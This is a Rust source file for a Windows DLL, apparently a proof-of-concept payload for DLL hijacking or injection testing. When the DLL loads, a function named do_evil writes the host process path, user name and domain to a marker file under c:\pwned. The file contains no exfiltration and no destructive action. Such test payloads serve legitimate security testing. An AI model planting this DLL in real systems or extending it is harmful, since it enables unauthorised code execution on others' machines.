#![cfg(windows)]

use std::io::Write;
use winapi::shared::minwindef;
use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
use std::fs::File;
use std::env;
use std::fs;

/// Entry point which will be called by the system once the DLL has been loaded
/// in the target process. Declaring this function is optional.
///
/// # Safety
///
/// What you can safely do inside here is very limited, see the Microsoft documentation
/// about "DllMain". Rust also doesn't officially support a "life before main()",
/// though it is unclear what that that means exactly for DllMain.
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    dll_module: HINSTANCE,
    call_reason: DWORD,
    reserved: LPVOID)
    -> BOOL
{
    const DLL_PROCESS_ATTACH: DWORD = 1;
    const DLL_PROCESS_DETACH: DWORD = 0;

    match call_reason {
        DLL_PROCESS_ATTACH => do_evil(),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }
    minwindef::TRUE
}

fn do_evil() {
    let pwned_path = "c:\\pwned";
    fs::create_dir_all(pwned_path).unwrap();
    let pid = std::process::id().to_string();
    let username = env::var("USERNAME").unwrap().as_str().to_owned();
    let domain = env::var("USERDOMAIN").unwrap().as_str().to_owned();
    let path = format!("{}\\pwned_{}.txt", pwned_path, pid);
    let process_path = std::env::current_exe().unwrap();

    let ss = format!("[*]      Process: {:?}\n[*]         User: {:?}\n[*]       Domain: {:?}\n[*] Created file: {:?}\n", 
            process_path, 
            username, 
            domain,
            path);
    println!("{}", ss);
    
    let mut file = File::create(path).unwrap();
    file.write_all(ss.as_bytes()).unwrap();
}
